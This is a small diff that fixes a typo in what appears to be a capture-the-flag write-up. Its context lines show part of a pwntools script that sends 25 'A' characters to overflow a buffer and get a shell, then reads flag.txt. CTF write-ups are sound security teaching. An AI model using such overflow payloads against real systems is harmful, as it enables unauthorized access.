@@ -51,7 +51,7 @@ p.recvline()
 p.sendline("A"*25)
 p.interactive()
 ```
-This should redirect us to shell, and we with a simple `ls` we can see an entry `flag.txt`, so we simply do `cat flag.txt` to obtain the flag:
+This should redirect us to shell, and with a simple `ls` we can see an entry `flag.txt`, so we simply do `cat flag.txt` to obtain the flag:
 
 ```
 $ ls
